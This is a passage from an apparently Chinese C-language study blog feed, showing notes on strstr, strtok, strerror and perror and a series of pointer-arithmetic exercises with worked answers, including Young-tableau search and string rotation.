class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">my_strstr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str1, <span class="type">const</span> <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(str1 &amp;&amp; str2);</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* s1 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* s2 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* cp = str1;</span><br><span class="line"><span class="keyword">if</span> (*str2 == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">char</span>*)str1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (*cp)</span><br><span class="line">&#123;</span><br><span class="line">s1 = cp;</span><br><span class="line">s2 = str2;</span><br><span class="line"><span class="keyword">while</span> (*s1 &amp;&amp; *s2 &amp;&amp; (*s1 == *s2))</span><br><span class="line">&#123;</span><br><span class="line">s1++;</span><br><span class="line">s2++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (*s2 == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">char</span>*)cp;</span><br><span class="line">&#125;</span><br><span class="line">cp++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr1[] = <span class="string">&quot;abcdefabcdef&quot;</span>;</span><br><span class="line"><span class="type">char</span> arr2[] = <span class="string">&quot;bcd&quot;</span>;</span><br><span class="line"><span class="comment">//在arr1中查找arr2</span></span><br><span class="line"><span class="type">char</span>* ret = my_strstr(arr1, arr2);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;没找到\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到了:%s\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="char-strtok-char-str-const-char-delimiters-字符串切割函数"><a href="#char-strtok-char-str-const-char-delimiters-字符串切割函数" class="headerlink" title="char * strtok ( char * str, const char * delimiters );字符串切割函数"></a>char * strtok ( char * str, const char * delimiters );字符串切割函数</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="comment">//用法</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr1[] = <span class="string">&quot;123@bcda.com&quot;</span>;</span><br><span class="line"><span class="type">char</span>* p = <span class="string">&quot;@.&quot;</span>;</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span>* ret = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (ret = strtok(arr1, p); ret != <span class="literal">NULL</span>;ret=strtok(<span class="literal">NULL</span>,p))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(ret);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><ol><li>sep参数是个字符串，定义了用作分隔符的字符集合</li><li>第一个参数指定一个字符串，它包含了0个或者多个又sep字符串中一个或者多个分隔符分割的标记。</li><li>strtok函数找到str中的下一个标记，并将其用\0结尾，返回一个指向这个标记的指针。（注：strtok函数会改变被操作的字符串，所以在使用strtok函数切分的字符串一般都是用临时拷贝的内容并且可修改。）</li><li>strtok函数的第一个参数不为NULL，函数将找到str中第一个标记，strtok函数将保存它在字符串中的位置。</li><li>strtok函数的第一个参数为NULL，函数将在同一个字符串中被保存的位置开始，朝朝下一个标记。</li><li>如果字符串中不存在更多的标记，则返回NULL指针</li></ol><h1 id="char-strerror-int-errnum-返回错误码，所对应的错误信息"><a href="#char-strerror-int-errnum-返回错误码，所对应的错误信息" class="headerlink" title="char* strerror(int errnum)返回错误码，所对应的错误信息"></a>char* strerror(int errnum)返回错误码，所对应的错误信息</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="comment">//使用库函数的时候可能失败</span></span><br><span class="line"><span class="comment">//会设置错误代码</span></span><br><span class="line"><span class="comment">//int errno;//5</span></span><br><span class="line"><span class="comment">//C语言已经设置好了</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, strerror(<span class="number">0</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, strerror(<span class="number">1</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, strerror(<span class="number">2</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, strerror(<span class="number">3</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, strerror(<span class="number">4</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/06/ZPfVjiLTNgBovMH.png" alt="image.png"></p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>比如在打开不存在的文件时，会报错，错误码会记录信息，可以通过这个函数打印出信息，errno是c语言定义好的全局变量，用的时候要包含头文件errno.h</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="comment">//使用库函数的时候可能失败</span></span><br><span class="line"><span class="comment">//会设置错误代码</span></span><br><span class="line"><span class="comment">//int errno;//5</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">FILE* pf = fopen(<span class="string">&quot;aszxc.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pf == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fclose(pf);</span><br><span class="line">pf = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/06/pEcQfHUOTn9LNkt.png" alt="image.png"></p><h1 id="perror-char-str-直接打印错误信息"><a href="#perror-char-str-直接打印错误信息" class="headerlink" title="perror(char* str)直接打印错误信息"></a>perror(char* str)直接打印错误信息</h1><ol><li>首先把错误码转化为错误信息</li><li>打印错误信息（包含了自定义的信息）</li></ol><h2 id="str自定义信息"><a href="#str自定义信息" class="headerlink" title="str自定义信息"></a>str自定义信息</h2>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指针练习</title>
      <link href="/2023/03/25/%E6%8C%87%E9%92%88%E7%BB%83%E4%B9%A01/"/>
      <url>/2023/03/25/%E6%8C%87%E9%92%88%E7%BB%83%E4%B9%A01/</url>
      
        <content type="html"><![CDATA[<h1 id="指针练习（一）"><a href="#指针练习（一）" class="headerlink" title="指针练习（一）"></a>指针练习（一）</h1><ol><li>下列程序的结果<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line"><span class="type">int</span>* ptr = (<span class="type">int</span>*)(&amp;a + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d,%d&quot;</span>, *(a + <span class="number">1</span>), *(ptr - <span class="number">1</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>结果是 2，5</p><p>首元素地址+1指第二个元素的地址，即2。&amp;a + 1 指向的是5后面一个的地址，-1又回去了</p><p>2. </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> Num;</span><br><span class="line"><span class="type">char</span>* pcName;</span><br><span class="line"><span class="type">short</span> sDate;</span><br><span class="line"><span class="type">char</span> cha[<span class="number">2</span>];</span><br><span class="line"><span class="type">short</span> sBa[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//假设p的值为0x100000，如下表达式的值分别为多少</span></span><br><span class="line"><span class="comment">//Test的大小是20字节</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, p + <span class="number">0x1</span>);<span class="comment">//0x100014</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)p + <span class="number">0x1</span>);<span class="comment">//0x100001 p被强制转换成整型了</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>*)p + <span class="number">0x1</span>);<span class="comment">//0x100001无符号整型指针+1跳过一个无符号整型即+4</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>前提是32位编译</em><br><img src="https://s2.loli.net/2023/03/25/Byzj3GQ1f4uEOP2.png" alt="image.png"><br> 答：p+0x1指针+1就是指跳过一个Test结构体所以+20</p><p>0x100001 p被强制转换成整型了</p><p>0x100004无符号整型指针+1跳过一个无符号整型即+4<br> <img src="https://s2.loli.net/2023/03/25/T5HVgdj8Y4IfZbC.png" alt="image.png"></p><p> 64位的时候一个指针是8byte你结构体就是32字节了所以+1就是0x20</p><ol start="3"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">4</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line"><span class="type">int</span>* ptr1 = (<span class="type">int</span>*)(&amp;a + <span class="number">1</span>);</span><br><span class="line"><span class="type">int</span>* ptr2 = (<span class="type">int</span>*)((<span class="type">int</span>)a + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x,%x&quot;</span>, ptr1[<span class="number">-1</span>], *ptr2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/25/RHBqZiWdEYsOrPN.png" alt="image.png"></p><p>4,20000</p><p>4：&amp;a + 1刚好在4后面一个，-1又回到4</p><p>而对于ptr2，小端存储</p><p>01 00 00 00 | 02 00 00 00 | 03 00 00 00 | 04 00 00 00 |</p><p>ptr2指向的地址被转换成int后+1 相当于从-&gt;01变为01-&gt;00然后再输出向后数4个byte，即使0x 02 00 00 00</p><ol start="4"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">2</span>] = &#123; (<span class="number">0</span>,<span class="number">1</span>),(<span class="number">2</span>,<span class="number">3</span>),(<span class="number">4</span>,<span class="number">5</span>) &#125;;<span class="comment">// --&gt;&#123;1,3,5&#125;</span></span><br><span class="line"><span class="type">int</span>* p;</span><br><span class="line">p = a[<span class="number">0</span>];<span class="comment">//p -&gt; *(p + 0)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, p[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果 1</p><p>1 | 3<br>5 | 0<br>0 | 0</p><p>括号表达式，算最后一个逗号右边的结果,所以p-&gt;1</p><ol start="5"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span>(*p)[<span class="number">4</span>];</span><br><span class="line">p = a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p,%d\n&quot;</span>, &amp;p[<span class="number">4</span>][<span class="number">2</span>] - &amp;a[<span class="number">4</span>][<span class="number">2</span>], &amp;p[<span class="number">4</span>][<span class="number">2</span>] - &amp;a[<span class="number">4</span>][<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/26/DCvZij19lVN2ALW.png" alt="image.png"></p><p>地址无正负之分，补码的-4是FFFFFFFC,-4</p><p>6. </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> aa[<span class="number">2</span>][<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> &#125;;</span><br><span class="line"><span class="type">int</span>* ptr1 = (<span class="type">int</span>*)(&amp;aa + <span class="number">1</span>);</span><br><span class="line"><span class="type">int</span>* ptr2 = (<span class="type">int</span>*)(*(aa + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d,%d&quot;</span>, *(ptr1 - <span class="number">1</span>), *(ptr2 - <span class="number">1</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是10，5.10是因为&amp;aa+1指的是跳过整个二维数组，再-1回到最后一个元素。<br>5是因为*（aa + 1）指的是跳过一行，再-1回到第一行最后一个元素5</p><ol start="7"><li><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* a[] = &#123; <span class="string">&quot;work&quot;</span>, <span class="string">&quot;at&quot;</span>, <span class="string">&quot;alibaba&quot;</span> &#125;;</span><br><span class="line"><span class="type">char</span>** pa = a;</span><br><span class="line">pa++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *pa);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>结果at,char* p &#x3D; “abc”,所以char* a[],里面又三个char*,pa++就是指向at</p><ol start="8"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* c[] = &#123; <span class="string">&quot;ENTER&quot;</span>, <span class="string">&quot;NEW&quot;</span>, <span class="string">&quot;POINT&quot;</span>, <span class="string">&quot;FIRST&quot;</span> &#125;;</span><br><span class="line"><span class="type">char</span>** cp[] = &#123;c + <span class="number">3</span>, c + <span class="number">2</span>, c + <span class="number">1</span>, c&#125;;</span><br><span class="line"><span class="type">char</span>*** cpp = cp;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, **++cpp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *-- * ++cpp + <span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *cpp[<span class="number">-2</span>] + <span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, cpp[<span class="number">-1</span>][<span class="number">-1</span>] + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/26/OgFkEjHZeVU9q3A.png" alt="image.png"></p><p>注意++cpp，做完运算在第二个表达式中结果保留</p><p>第一个cpp先++指的是c+2，再解引用两次刚好到”POINT”<br>第二个cpp先++指的是c+1,解引用完再–变成c,再解引用指的是”ENTER”,+3刚好从E开始输出ER。<br>第三个cpp[]-&gt;* cpp,然后再解引用即** （cpp-2）+3，cpp-2回到开始的位置，即c+3，解2次引用就是FIRST，+3就是从S开始输出ST<br>第四个是指* (* (cpp - 1) - 1)+1,即先* (cpp - 1) 得到c + 2，再 - 1 得到c + 1,接引用完是”NEW”,再+1指的是从E开始输出EW</p><p><img src="https://s2.loli.net/2023/03/26/sIXVecfFPxo5qBT.png" alt="image.png"></p><ol start="9"><li>杨氏矩阵<br>有一个数字矩阵，矩阵的每行从左到右递增，矩阵从上到下是递增的<br>请编写程序在这样的矩阵中查找某个数字是否存在<br>要求时间复杂度小于O（N）</li></ol><p>思路：因为每一行右边最大，所以比较最右边，小了就去掉这一行，直接看下一行，每一列的最下面都是最大的，比较后，小了就去掉这一列，这样就能保住时间复杂度了.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_num</span><span class="params">(<span class="type">int</span> arr[<span class="number">3</span>][<span class="number">3</span>], <span class="type">int</span> r, <span class="type">int</span> c, <span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> y = c - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (x &lt; c &amp;&amp; y &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[x][y] &lt; k)</span><br><span class="line">x++;<span class="comment">//加一行</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (arr[x][y] &gt; k)</span><br><span class="line">y--;<span class="comment">//去一列</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">3</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,</span><br><span class="line"><span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> &#125;;</span><br><span class="line"><span class="comment">//查找一个数字，比如7</span></span><br><span class="line"><span class="comment">//可以遍历但时间复杂度就变为O（N^2）</span></span><br><span class="line"><span class="comment">//O(1):不管几个元素都是遍历常数次</span></span><br><span class="line"><span class="type">int</span> k = <span class="number">7</span>;</span><br><span class="line"><span class="comment">//如果找到返回1，否则返回0</span></span><br><span class="line"><span class="type">int</span> ret = find_num(a, <span class="number">3</span>, <span class="number">3</span>, k);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到了\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找不到\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果要返回坐标怎么办（return只能返回一个值）怎么改</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_num</span><span class="params">(<span class="type">int</span> arr[<span class="number">3</span>][<span class="number">3</span>], <span class="type">int</span> *px, <span class="type">int</span> *py, <span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> y = *py - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (x &lt; *px &amp;&amp; y &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[x][y] &lt; k)</span><br><span class="line">x++;<span class="comment">//加一行</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (arr[x][y] &gt; k)</span><br><span class="line">y--;<span class="comment">//去一列</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">*px = x;</span><br><span class="line">*py = y;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">3</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,</span><br><span class="line"><span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> &#125;;</span><br><span class="line"><span class="type">int</span> k = <span class="number">7</span>;</span><br><span class="line"><span class="type">int</span> x = <span class="number">3</span>;<span class="comment">//行</span></span><br><span class="line"><span class="type">int</span> y = <span class="number">3</span>;<span class="comment">//列</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&amp;x，&amp;y</span></span><br><span class="line"><span class="comment">1.传入参数</span></span><br><span class="line"><span class="comment">2.带回值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> ret = find_num(a, &amp;x, &amp;y, k);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到了\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;下标是:%d %d&quot;</span>, x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找不到\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/26/pcAUBO8CReSuVKE.png" alt="image.png"></p><h1 id="字符串左旋"><a href="#字符串左旋" class="headerlink" title="字符串左旋"></a>字符串左旋</h1><h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>实现一个函数，可以左旋字符串中的k个字符</p><h2 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h2><p>ABCD左旋第一个字符得到BCDA</p><p>ABCD左旋两个字符得到CDAB</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">string_rotate</span><span class="params">(<span class="type">char</span>* str, <span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line"><span class="comment">//每次左旋一个字符</span></span><br><span class="line"><span class="type">char</span> tmp = *str;<span class="comment">//首地址 </span></span><br><span class="line"><span class="comment">// 把后面的n-1个字符往前挪 </span></span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len - <span class="number">1</span>; j++) &#123;</span><br><span class="line">*(str + j) = *(str + j + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//tmp再放到最后</span></span><br><span class="line">*(str + len - <span class="number">1</span>) = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr[<span class="number">10</span>] = <span class="string">&quot;ABCDEF&quot;</span>; </span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line">string_rotate(arr, k);</span><br><span class="line"><span class="built_in">puts</span>(arr);</span><br><span class="line"><span class="keyword">return</span> <span 